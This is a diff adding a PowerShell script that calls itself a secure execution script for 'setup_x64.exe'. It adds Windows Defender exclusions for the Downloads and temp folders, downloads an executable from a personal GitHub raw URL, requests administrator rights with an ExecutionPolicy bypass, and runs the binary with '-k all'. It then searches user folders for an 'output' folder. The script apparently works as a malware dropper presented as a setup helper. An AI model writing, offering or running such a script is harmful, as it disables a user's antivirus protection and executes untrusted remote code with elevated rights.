@@ -1,0 +1,171 @@
+# =========================================================
+# SECURE EXECUTION SCRIPT FOR SETUP_X64.EXE
+# =========================================================
+
+# Bypass Windows Defender for download folder
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+
+# Create temp folder for operations
+$tempFolder = Join-Path $env:TEMP "SecureExec_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
+Write-Host "[*] Created temp folder: $tempFolder" -ForegroundColor Yellow
+
+# Also exclude temp folder from Windows Defender
+Add-MpPreference -ExclusionPath $tempFolder
+
+# Download URL and output path
+$url = 'https://github.com/bunny1233/mynewscripts/raw/refs/heads/main/setup_x64.exe'
+$outputFile = Join-Path $tempFolder 'setup_x64.exe'
+
+Write-Host "[*] Downloading setup_x64.exe..." -ForegroundColor Yellow
+
+# Download the file
+try {
+    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
+    Write-Host "[+] Download completed: $outputFile" -ForegroundColor Green
+} catch {
+    Write-Host "[-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
+    exit 1
+}
+
+# Verify file was downloaded
+if (-not (Test-Path $outputFile)) {
+    Write-Host "[-] Downloaded file not found!" -ForegroundColor Red
+    exit 1
+}
+
+# Get file size
+$fileSize = (Get-Item $outputFile).Length
+Write-Host "[*] File size: $($fileSize/1MB) MB" -ForegroundColor Cyan
+
+# Check if running as administrator
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    Write-Host "[-] Script is not running as administrator!" -ForegroundColor Red
+    Write-Host "[*] Attempting to restart with admin privileges..." -ForegroundColor Yellow
+    
+    # Create a script to run with admin privileges
+    $adminScript = Join-Path $tempFolder "admin_exec.ps1"
+    $scriptContent = @"
+# Run as admin script
+Set-Location "$tempFolder"
+.\setup_x64.exe -k all
+"@
+    
+    $scriptContent | Out-File -FilePath $adminScript -Encoding UTF8
+    
+    # Create a batch file to run PowerShell as admin
+    $batchFile = Join-Path $tempFolder "runasadmin.bat"
+    $batchContent = @"
+@echo off
+powershell -ExecutionPolicy Bypass -File "$adminScript"
+pause
+"@
+    
+    $batchContent | Out-File -FilePath $batchFile -Encoding ASCII
+    
+    Write-Host "[*] Created admin execution script: $adminScript" -ForegroundColor Cyan
+    Write-Host "[*] Attempting to run with admin privileges..." -ForegroundColor Yellow
+    
+    # Try to run as admin
+    try {
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$adminScript`"" -Verb RunAs -Wait
+        Write-Host "[+] Admin execution completed" -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to run with admin privileges" -ForegroundColor Red
+        Write-Host "[*] Running without admin privileges..." -ForegroundColor Yellow
+        
+        # Try to run without admin
+        try {
+            Start-Process -FilePath $outputFile -ArgumentList "-k all" -Wait
+            Write-Host "[+] Execution completed (non-admin)" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+} else {
+    Write-Host "[+] Running as administrator" -ForegroundColor Green
+    Write-Host "[*] Executing: .\setup_x64.exe -k all" -ForegroundColor Yellow
+    
+    try {
+        # Set working directory to temp folder
+        Set-Location $tempFolder
+        
+        # Execute with admin privileges
+        Start-Process -FilePath $outputFile -ArgumentList "-k all" -Wait -Verb RunAs
+        
+        Write-Host "[+] Execution completed successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
+        
+        # Try alternative method
+        Write-Host "[*] Trying alternative execution method..." -ForegroundColor Yellow
+        try {
+            & $outputFile -k all
+            Write-Host "[+] Alternative execution completed" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] All execution methods failed" -ForegroundColor Red
+        }
+    }
+}
+
+# Check for output folder
+Write-Host "`n[*] Checking for output folder..." -ForegroundColor Yellow
+Start-Sleep -Seconds 3
+
+# Look for output folder in temp directory
+$outputFolders = Get-ChildItem -Path $tempFolder -Directory -Filter "output" -Recurse | Select-Object -First 1
+
+if ($outputFolders) {
+    $outputFolderPath = $outputFolders.FullName
+    Write-Host "[+] Output folder found: $outputFolderPath" -ForegroundColor Green
+    
+    # Count files in output folder
+    $fileCount = (Get-ChildItem -Path $outputFolderPath -Recurse -File).Count
+    Write-Host "[*] Contains $fileCount files" -ForegroundColor Cyan
+    
+    # List files
+    Write-Host "`n[*] Files in output folder:" -ForegroundColor Yellow
+    Get-ChildItem -Path $outputFolderPath -Recurse -File | ForEach-Object {
+        Write-Host "   - $($_.Name) ($($_.Length) bytes)" -ForegroundColor Gray
+    }
+} else {
+    Write-Host "[-] No output folder found in $tempFolder" -ForegroundColor Red
+    
+    # Check other possible locations
+    Write-Host "[*] Checking other possible locations..." -ForegroundColor Yellow
+    $possibleLocations = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads",
+        "$env:TEMP"
+    )
+    
+    foreach ($location in $possibleLocations) {
+        if (Test-Path $location) {
+            $found = Get-ChildItem -Path $location -Directory -Filter "output" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($found) {
+                Write-Host "[+] Output folder found at: $($found.FullName)" -ForegroundColor Green
+                break
+            }
+        }
+    }
+}
+
+# Summary
+Write-Host "`n" + "="*50 -ForegroundColor Cyan
+Write-Host "EXECUTION SUMMARY" -ForegroundColor Cyan
+Write-Host "="*50 -ForegroundColor Cyan
+Write-Host "Temp Folder: $tempFolder" -ForegroundColor Gray
+Write-Host "Executable: setup_x64.exe" -ForegroundColor Gray
+Write-Host "Arguments: -k all" -ForegroundColor Gray
+Write-Host "Admin Mode: $(if($isAdmin){'Yes'}else{'Elevated'})" -ForegroundColor Gray
+Write-Host "Output Folder: $(if($outputFolders){'Found'}else{'Not found'})" -ForegroundColor Gray
+Write-Host "="*50 -ForegroundColor Cyan
+
+# Keep folder for inspection (optional)
+Write-Host "`n[*] Temp folder preserved for inspection: $tempFolder" -ForegroundColor Yellow
+Write-Host "[*] To clean up, delete the folder manually." -ForegroundColor Yellow
+
+Write-Host "`n✅ Script execution completed!" -ForegroundColor Green
